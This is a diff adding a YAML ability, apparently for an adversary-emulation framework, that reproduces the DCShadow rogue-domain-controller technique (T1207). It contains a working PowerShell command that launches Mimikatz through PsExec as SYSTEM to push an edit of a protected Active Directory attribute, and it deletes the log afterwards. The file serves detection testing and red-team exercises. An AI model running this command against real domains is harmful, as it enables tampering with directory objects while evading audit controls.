@@ -1,0 +1,47 @@
+---
+- id: acd37a62e589a7190c35101583939337
+  name: DCShadow (Active Directory)
+  description: 'Use Mimikatz DCShadow method to simulate behavior of an Active Directory
+    Domain Controller and edit protected attribute.
+
+
+    [DCShadow](https://www.dcshadow.com/)
+
+    [Additional Reference](http://www.labofapenetrationtester.com/2018/04/dcshadow.html)
+
+
+    It will set the badPwdCount attribute of the target user (user/machine account)
+    to 9999. You can check after with:
+
+    Get-ADObject -LDAPFilter ''(samaccountname=<user>)'' -Properties badpwdcount |
+    select-object -ExpandProperty badpwdcount
+
+
+    Need SYSTEM privileges locally (automatically obtained via PsExec, so running
+    as admin is sufficient), and Domain Admin remotely.
+
+    The easiest is to run elevated and as a Domain Admin user.
+
+    '
+  tactic: defense-impairment
+  technique:
+    attack_id: T1207
+    name: Rogue Domain Controller
+  platforms:
+    windows:
+      psh:
+        command: '$dc_output_file = "PathToAtomicsFolder\..\ExternalPayloads\art-T1207-mimikatz-DC.log";
+          Remove-Item $dc_output_file -ErrorAction Ignore; $mimikatzParam ="`"log
+          $dc_output_file`" `"lsadump::dcshadow /object:#{object} /attribute:#{attribute}
+          /value:#{value}`" `"exit`""; $dc = Start-Process -FilePath cmd.exe -Verb
+          Runas -ArgumentList "/c ''#{psexec_path}'' /accepteula -d -s #{mimikatz_path}
+          $mimikatzParam"; Start-Sleep -Seconds 5; & "#{mimikatz_path}" "lsadump::dcshadow
+          /push" "exit"; Write-Host "`nWaiting for fake DC server to return"; Wait-Process
+          $dc; Write-Host "`nOutput from fake DC server:"; Get-Content $dc_output_file;
+          Start-Sleep 1; Remove-Item $dc_output_file -ErrorAction Ignore; Write-Host
+          "End of DCShadow"'
+        payloads: []
+        cleanup: Stop-Process -Name "mimikatz" -Force -ErrorAction Ignore
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
